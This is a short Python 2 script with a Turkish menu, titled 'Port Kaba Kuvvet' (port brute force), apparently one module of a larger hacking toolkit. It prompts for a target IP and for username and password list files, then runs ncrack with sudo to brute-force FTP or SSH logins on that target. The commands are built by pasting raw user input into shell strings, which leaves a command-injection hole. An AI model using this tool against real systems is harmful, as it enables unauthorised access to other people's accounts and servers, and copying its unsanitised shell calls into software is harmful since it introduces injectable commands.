#!/usr/bin/env Python
# -*- coding: utf-8 -*-

import os 

os.system("clear")
os.system("figlet Port Kaba Kuvvet ")

print("""\033[36m Port Kaba Kuvvet Aracına Hoş Geldiniz.
\033[33m---------------------------------
\033[33m 1) FTP
\033[33m 2) SSH
\033[33m 3) Aracı yeniden başlat
\033[33m 4) Menüye Dön
\033[33m 5) Çık\033[0m
\033[33m---------------------------------
""")
 
islemno = raw_input("\033[33mLütfen Yapılacak İşlemi Seçiniz:\033[0m ")

 
if(islemno == "1"):
	hedefip = raw_input("Hedef IP Adresi Giriniz: ")
	kullaniciadi = raw_input("Kullanıcı Adları Dosya Yolunu Belirtiniz: ")
	parola = raw_input("Parolar Dosya Yolunu Belirtiniz: ")
	os.system("sudo ncrack -p 21 -U " + kullaniciadi + " -P " + parola + " " + hedefip)
elif(islemno == "2"):
	hedefip = raw_input("Hedef IP Adresi Giriniz: ")
	kullaniciadi = raw_input("Kullanıcı Adları Dosya Yolunu Belirtiniz: ")
	parola = raw_input("Parolar Dosya Yolunu Belirtiniz: ")
	os.system("sudo ncrack -p 22 -U " + kullaniciadi + " -P " + parola + " " + hedefip)
elif(islemno == "3"):
	os.system("sudo python ./tools/Port_Kaba_Kuvvet.py")
	
elif(islemno == "4"):
	os.system("sudo python ./main.py")

elif(islemno == "5"):
	os.system("clear")
	os.system("exit")
else:
	os.system("sudo python ./tools/Port_Kaba_Kuvvet.py")
 	
 	
